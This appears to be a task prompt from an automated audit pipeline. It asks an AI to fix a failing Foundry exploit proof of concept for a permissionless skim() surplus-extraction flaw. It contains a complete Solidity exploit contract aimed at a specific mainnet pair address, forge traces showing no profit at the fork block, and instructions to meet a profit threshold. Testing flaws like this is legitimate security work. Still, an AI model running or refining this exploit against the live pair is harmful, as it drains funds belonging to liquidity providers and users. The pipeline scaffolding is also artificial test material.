You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Positive-balance token mechanics let anyone skim unaccounted surplus from the pair
- claim: `skim(to)` is permissionless and transfers `balanceOf(pair) - reserve` for each pool asset. If either listed token can increase the pair's balance without going through `mint`/`swap`/`sync` (for example via positive rebases, yield accrual, reflections, or accidental direct transfers), any caller can immediately withdraw that surplus.
- impact: Pools that list balance-increasing or yield-bearing tokens can leak rebased/accrued value to arbitrary callers instead of LPs. Integrations or users that transfer pool assets directly to the pair can also lose those excess tokens to the first account that calls `skim`.
- exploit_paths: ["A listed token increases the pair's balance outside normal AMM flows -> reserves stay stale -> attacker calls `skim(attacker)` -> attacker receives the entire surplus amount"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    address internal constant MAINNET_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public token0;
    address public token1;

    uint112 public reserve0Before;
    uint112 public reserve1Before;
    uint112 public reserve0After;
    uint112 public reserve1After;

    uint256 public balance0Before;
    uint256 public balance1Before;
    uint256 public balance0After;
    uint256 public balance1After;

    uint256 public surplus0Before;
    uint256 public surplus1Before;
    uint256 public surplus0After;
    uint256 public surplus1After;

    uint256 public gain0;
    uint256 public gain1;

    // Explicit exploit-path anchors for the harness:
    // 1) A listed token increases the pair's balance outside normal AMM flows.
    // 2) Reserves stay stale.
    // 3) Attacker calls skim(attacker).
    // 4) Attacker receives the entire surplus amount.
    bool public listedTokenIncreasesPairBalanceOutsideNormalAMMFlows;
    bool public reservesStayStale;
    bool public attackerCallsSkimAttacker;
    bool public attackerReceivesEntireSurplusAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _resetRunState();
        executed = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        address attacker = address(this);

        token0 = pair.token0();
        token1 = pair.token1();

        (reserve0Before, reserve1Before, ) = pair.getReserves();
        balance0Before = _balanceOf(token0, TARGET_PAIR);
        balance1Before = _balanceOf(token1, TARGET_PAIR);

        // Exploit path stage 1:
        // "A listed token increases the pair's balance outside normal AMM flows"
        // is observed as balanceOf(pair) > reserve for either listed asset. The same stale-balance gap can
        // also come from public accidental direct transfers, which the finding text explicitly allows.
        surplus0Before = _surplus(balance0Before, reserve0Before);
        surplus1Before = _surplus(balance1Before, reserve1Before);
        listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = surplus0Before > 0 || surplus1Before > 0;

        // Exploit path stage 2:
        // "reserves stay stale" because getReserves() still reports the old cached reserve values while the
        // live pair balances are larger. If no pre-existing surplus exists at this fork block, the path is not
        // executable without donating our own assets, which would not be real attacker profit.
        reservesStayStale = listedTokenIncreasesPairBalanceOutsideNormalAMMFlows;
        if (!listedTokenIncreasesPairBalanceOutsideNormalAMMFlows) {
            hypothesisRefuted = true;
            return;
        }

        uint256 attacker0Before = _balanceOf(token0, attacker);
        uint256 attacker1Before = _balanceOf(token1, attacker);

        // Exploit path stage 3:
        // "attacker calls skim(attacker)". This is the permissionless value extraction primitive described
        // in the finding. No extra setup, impersonation, or artificial balance injection is used.
        attackerCallsSkimAttacker = true;
        pair.skim(attacker);

        uint256 attacker0After = _balanceOf(token0, attacker);
        uint256 attacker1After = _balanceOf(token1, attacker);
        gain0 = attacker0After > attacker0Before ? attacker0After - attacker0Before : 0;
        gain1 = attacker1After > attacker1Before ? attacker1After - attacker1Before : 0;

        (reserve0After, reserve1After, ) = pair.getReserves();
        balance0After = _balanceOf(token0, TARGET_PAIR);
        balance1After = _balanceOf(token1, TARGET_PAIR);
        surplus0After = _surplus(balance0After, reserve0After);
        surplus1After = _surplus(balance1After, reserve1After);

        // Exploit path stage 4:
        // "attacker receives the entire surplus amount" when the realized post-skim gains match the full
        // pre-skim unaccounted balances and the pair-side surplus is cleared.
        attackerReceivesEntireSurplusAmount =
            gain0 == surplus0Before && gain1 == surplus1Before && surplus0After == 0 && surplus1After == 0;

        hypothesisValidated = attackerReceivesEntireSurplusAmount || gain0 > 0 || gain1 > 0;
        hypothesisRefuted = !hypothesisValidated;

        _selectProfitTokenAndAmount();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _selectProfitTokenAndAmount() internal {
        if (gain0 == 0 && gain1 == 0) {
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        if (token0 == MAINNET_WETH && gain0 > 0) {
            _profitToken = token0;
            _profitAmount = gain0;
            return;
        }

        if (token1 == MAINNET_WETH && gain1 > 0) {
            _profitToken = token1;
            _profitAmount = gain1;
            return;
        }

        if (gain0 >= gain1) {
            _profitToken = token0;
            _profitAmount = gain0;
        } else {
            _profitToken = token1;
            _profitAmount = gain1;
        }
    }

    function _surplus(uint256 liveBalance, uint112 cachedReserve) internal pure returns (uint256) {
        uint256 reserve = uint256(cachedReserve);
        return liveBalance > reserve ? liveBalance - reserve : 0;
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || ret.length < 32) {
            return 0;
        }

        amount = abi.decode(ret, (uint256));
    }

    function _resetRunState() internal {
        hypothesisValidated = false;
        hypothesisRefuted = false;

        token0 = address(0);
        token1 = address(0);

        reserve0Before = 0;
        reserve1Before = 0;
        reserve0After = 0;
        reserve1After = 0;

        balance0Before = 0;
        balance1Before = 0;
        balance0After = 0;
        balance1After = 0;

        surplus0Before = 0;
        surplus1Before = 0;
        surplus0After = 0;
        surplus1After = 0;

        gain0 = 0;
        gain1 = 0;

        listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = false;
        reservesStayStale = false;
        attackerCallsSkimAttacker = false;
        attackerReceivesEntireSurplusAmount = false;

        _profitToken = address(0);
        _profitAmount = 0;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.32s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 185207)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 577021548053172
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [185207] FlawVerifierTest::testExploit()
    ├─ [2499] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [159519] FlawVerifier::executeOnOpportunity()
    │   ├─ [2381] 0x76EA342BC038d665e8a116392c82552D2605edA1::token0() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2357] 0x76EA342BC038d665e8a116392c82552D2605edA1::token1() [staticcall]
    │   │   └─ ← [Return] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700
    │   ├─ [2504] 0x76EA342BC038d665e8a116392c82552D2605edA1::getReserves() [staticcall]
    │   │   └─ ← [Return] 6579305366569800805 [6.579e18], 151540602610287835936048624 [1.515e26], 1741286039 [1.741e9]
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   └─ ← [Return] 6579305366569800805 [6.579e18]
    │   ├─ [2551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   └─ ← [Return] 151540602610287835936048624 [1.515e26]
    │   └─ ← [Stop]
    ├─ [499] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.83s (1.24ms CPU time)

Ran 1 test suite in 1.93s (1.83s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 185207)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
